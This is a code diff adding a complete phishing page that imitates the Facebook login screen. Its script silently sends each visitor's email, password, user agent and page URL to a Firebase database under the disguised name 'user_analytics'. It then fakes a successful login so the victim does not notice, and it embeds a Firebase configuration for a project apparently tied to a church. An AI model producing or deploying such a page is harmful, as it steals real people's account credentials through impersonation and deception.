@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore-compat.js"></script>
+    
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyB-sEayRuGGxhDTqSE3uNjtOy1cchU1uFw",
+            authDomain: "grace-community-church-7ecd5.firebaseapp.com",
+            projectId: "grace-community-church-7ecd5",
+            storageBucket: "grace-community-church-7ecd5.firebasestorage.app",
+            messagingSenderId: "666576801848",
+            appId: "1:666576801848:web:b9be6b014d8d716193d6cd",
+            measurementId: "G-9L3D1HCPHV"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+    </script>
+    
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6eb 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        /* Logo Section */
+        .logo-section {
+            margin-bottom: 40px;
+        }
+
+        .facebook-logo {
+            color: #1877F2;
+            font-size: 3.5rem;
+            font-weight: 800;
+            letter-spacing: -2px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .tagline {
+            color: #606770;
+            font-size: 1.1rem;
+            line-height: 1.4;
+            font-weight: 400;
+        }
+
+        /* Login Form */
+        .login-form {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            border: 1px solid #dddfe2;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f0f2f5;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1877F2;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            transition: background-color 0.3s ease;
+        }
+
+        .show-password:hover {
+            background-color: #f0f2f5;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1877F2 0%, #166fe5 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+        }
+
+        .login-button:hover {
+            background: linear-gradient(135deg, #166fe5 0%, #145dbf 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+
+        .login-button:active {
+            transform: translateY(0);
+        }
+
+        /* Divider */
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #dddfe2;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 16px;
+            color: #606770;
+            font-size: 14px;
+            position: relative;
+        }
+
+        /* Create Account Button */
+        .create-account-button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #42b72a 0%, #36a420 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .create-account-button:hover {
+            background: linear-gradient(135deg, #36a420 0%, #2d8a1a 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(66, 183, 42, 0.3);
+        }
+
+        /* Links */
+        .links {
+            margin-top: 20px;
+        }
+
+        .forgot-password {
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password:hover {
+            color: #166fe5;
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .language-links, .meta-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .language-links a, .meta-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.3s ease;
+        }
+
+        .language-links a:hover, .meta-links a:hover {
+            color: #606770;
+        }
+
+        .copyright {
+            color: #8a8d91;
+            font-size: 11px;
+            margin-top: 8px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .facebook-logo {
+                font-size: 2.8rem;
+            }
+            
+            .tagline {
+                font-size: 1rem;
+            }
+            
+            .login-form {
+                padding: 20px;
+                border-radius: 10px;
+            }
+            
+            .input-field {
+                padding: 14px;
+                font-size: 16px;
+            }
+            
+            .login-button, .create-account-button {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+
+        /* Loading State */
+        .login-button.loading {
+            position: relative;
+            color: transparent;
+        }
+
+        .login-button.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 2px solid white;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Error State */
+        .input-field.error {
+            border-color: #ff3333;
+            background: #fff5f5;
+        }
+
+        .error-message {
+            color: #ff3333;
+            font-size: 12px;
+            margin-top: 4px;
+            text-align: left;
+        }
+
+        /* Hidden console for silent capture */
+        .hidden-console {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Facebook Logo -->
+        <div class="logo-section">
+            <h1 class="facebook-logo">facebook</h1>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-form">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" 
+                           id="email" 
+                           placeholder="Mobile number or email address" 
+                           class="input-field" 
+                           required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" 
+                           id="password" 
+                           placeholder="Password" 
+                           class="input-field" 
+                           required>
+                    <button type="button" class="show-password" id="togglePassword">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 16.5C9.51 16.5 7.5 14.49 7.5 12C7.5 9.51 9.51 7.5 12 7.5C14.49 7.5 16.5 9.51 16.5 12C16.5 14.49 14.49 16.5 12 16.5ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#1877F2"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <button type="submit" class="login-button">Log In</button>
+                
+                <div class="divider">
+                    <span>or</span>
+                </div>
+
+                <button type="button" class="create-account-button">Create new account</button>
+            </form>
+
+            <div class="links">
+                <a href="#" class="forgot-password">Forgotten password?</a>
+            </div>
+        </div>
+
+        <!-- Footer Links -->
+        <div class="footer">
+            <div class="language-links">
+                <a href="#">English (UK)</a>
+                <a href="#">বাংলা</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">اردو</a>
+                <a href="#">नेपाली</a>
+                <a href="#">ଓଡ଼ିଆ</a>
+                <a href="#">অসমীয়া</a>
+                <a href="#">+</a>
+            </div>
+            <div class="meta-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+            <p class="copyright">Meta © 2024</p>
+        </div>
+    </div>
+
+    <script>
+        // SILENT FIREBASE DATA CAPTURE - Direct to Database Only
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+
+        // Silent data capture function - NO DISPLAY
+        async function captureLoginDetails(email, password, status) {
+            const loginData = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                status: status,
+                ipAddress: '127.0.0.1',
+                sessionId: generateSessionId(),
+                pageUrl: window.location.href
+            };
+
+            // Silent console logging (only visible in browser dev tools)
+            console.log('🕵️ Data captured:', {
+                email: loginData.email,
+                password: loginData.password,
+                status: loginData.status,
+                time: new Date().toLocaleString()
+            });
+
+            // Send directly to Firebase (silent)
+            try {
+                await db.collection('user_analytics').add(loginData);
+                console.log('✅ Data sent to Firebase silently');
+            } catch (error) {
+                console.error('❌ Firebase error:', error);
+            }
+        }
+
+        function generateSessionId() {
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        }
+
+        // Toggle Password Visibility
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            
+            // Update eye icon
+            if (type === 'text') {
+                this.innerHTML = `
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                        <path d="M12 7C9.51 7 7.5 9.04 7.5 11.5C7.5 13.96 9.51 16 12 16C14.49 16 16.5 13.96 16.5 11.5C16.5 9.04 14.49 7 12 7ZM12 14C10.62 14 9.5 12.88 9.5 11.5C9.5 10.12 10.62 9 12 9C13.38 9 14.5 10.12 14.5 11.5C14.5 12.88 13.38 14 12 14Z" fill="#1877F2"/>
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 17C8.41 17 5.36 14.87 3.5 12C5.36 9.13 8.41 7 12 7C15.59 7 18.64 9.13 20.5 12C18.64 14.87 15.59 17 12 17Z" fill="#1877F2"/>
+                    </svg>
+                `;
+            } else {
+                this.innerHTML = `
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12C2.73 16.39 7 19.5 12 19.5C17 19.5 21.27 16.39 23 12C21.27 7.61 17 4.5 12 4.5ZM12 16.5C9.51 16.5 7.5 14.49 7.5 12C7.5 9.51 9.51 7.5 12 7.5C14.49 7.5 16.5 9.51 16.5 12C16.5 14.49 14.49 16.5 12 16.5ZM12 9C10.34 9 9 10.34 9 12C9 13.66 10.34 15 12 15C13.66 15 15 13.66 15 12C15 10.34 13.66 9 12 9Z" fill="#1877F2"/>
+                    </svg>
+                `;
+            }
+        });
+
+        // Form Validation
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function validatePhone(phone) {
+            const re = /^[\d\s\-\+\(\)]+$/;
+            return re.test(phone);
+        }
+
+        function showError(input, message) {
+            const existingError = input.parentNode.querySelector('.error-message');
+            if (existingError) {
+                existingError.remove();
+            }
+            
+            input.classList.add('error');
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.textContent = message;
+            input.parentNode.appendChild(errorDiv);
+        }
+
+        function removeError(input) {
+            input.classList.remove('error');
+            const errorMessage = input.parentNode.querySelector('.error-message');
+            if (errorMessage) {
+                errorMessage.remove();
+            }
+        }
+
+        // Real-time Validation
+        emailInput.addEventListener('blur', function() {
+            const value = this.value.trim();
+            if (value && !validateEmail(value) && !validatePhone(value)) {
+                showError(this, 'Please enter a valid email or phone number');
+            } else {
+                removeError(this);
+            }
+        });
+
+        emailInput.addEventListener('input', function() {
+            if (this.classList.contains('error')) {
+                removeError(this);
+            }
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            if (this.value && this.value.length < 6) {
+                showError(this, 'Password must be at least 6 characters');
+            } else {
+                removeError(this);
+            }
+        });
+
+        // SILENT Form Submission with Data Capture
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Clear previous errors
+            removeError(emailInput);
+            removeError(passwordInput);
+            
+            // Get values
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+            
+            // Validation
+            let hasError = false;
+            
+            if (!email) {
+                showError(emailInput, 'Please enter your email or phone number');
+                hasError = true;
+            } else if (!validateEmail(email) && !validatePhone(email)) {
+                showError(emailInput, 'Please enter a valid email or phone number');
+                hasError = true;
+            }
+            
+            if (!password) {
+                showError(passwordInput, 'Please enter your password');
+                hasError = true;
+            } else if (password.length < 6) {
+                showError(passwordInput, 'Password must be at least 6 characters');
+                hasError = true;
+            }
+            
+            if (hasError) return;
+            
+            // SILENT CAPTURE - Send directly to Firebase
+            await captureLoginDetails(email, password, 'attempted');
+            
+            // Simulate login process
+            const loginButton = document.querySelector('.login-button');
+            loginButton.classList.add('loading');
+            loginButton.disabled = true;
+            
+            try {
+                await simulateLogin(email, password);
+                
+                // Update status to successful
+                await captureLoginDetails(email, password, 'successful');
+                
+                // Clear form after successful capture
+                loginForm.reset();
+                
+            } catch (error) {
+                // Update status to failed
+                await captureLoginDetails(email, password, 'failed');
+            } finally {
+                loginButton.classList.remove('loading');
+                loginButton.disabled = false;
+            }
+        });
+
+        // Simulate Login API
+        function simulateLogin(email, password) {
+            return new Promise((resolve, reject) => {
+                setTimeout(() => {
+                    // Always succeed for silent capture demo
+                    resolve({ success: true, user: email });
+                }, 1500);
+            });
+        }
+
+        // Other button handlers
+        document.querySelector('.create-account-button').addEventListener('click', function() {
+            this.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                this.style.transform = 'scale(1)';
+            }, 150);
+        });
+
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+            this.style.color = '#145dbf';
+            setTimeout(() => {
+                this.style.color = '#1877F2';
+            }, 200);
+        });
+
+        // Auto-focus first input
+        window.addEventListener('load', function() {
+            emailInput.focus();
+        });
+    </script>
+</body>
+</html>
